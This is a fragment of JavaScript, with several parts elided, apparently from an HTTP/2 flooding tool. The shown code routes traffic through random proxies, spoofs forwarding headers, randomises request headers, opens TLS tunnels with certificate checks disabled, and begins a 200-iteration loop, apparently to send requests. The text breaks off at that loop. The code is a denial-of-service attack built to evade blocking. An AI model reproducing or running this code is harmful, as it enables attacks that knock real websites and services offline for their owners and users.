...
if (cluster.isMaster) {
  ...
  function flood() {
    ...
    var proxy = proxys[Math.floor(Math.random() * proxys.length)].split(":");
    var header = {":path": parsed.path, "X-Forwarded-For": proxy[0], "X-Forwarded-Host": proxy[0], ":method": "GET", "User-agent": uas, Origin: target, Accept: accept_header[Math.floor(Math.random() * accept_header.length)], "Accept-Encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)], "Accept-Language": lang_header[Math.floor(Math.random() * lang_header.length)], "Cache-Control": controle_header[Math.floor(Math.random() * controle_header.length)]};
    const agent = new http.Agent({keepAlive: true, keepAliveMsecs: 1e4, maxSockets: 0});
    var req = http.request({host: proxy[0], agent: agent, globalAgent: agent, port: proxy[1], headers: {Host: parsed.host, "Proxy-Connection": "Keep-Alive", Connection: "Keep-Alive"}, method: "CONNECT", path: parsed.host + ":443"}, function () {
      req.setSocketKeepAlive(true);
    });
    req.on("connect", function (res, socket, head) {
      const client = http2.connect(parsed.href, {createConnection: () => tls.connect({host: parsed.host, ciphers: cipper, secureProtocol: "TLS_method", TLS_MAX_VERSION: "1.2", servername: parsed.host, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: socket}, function () {
        for (let i = 0; i < 200; i++) {
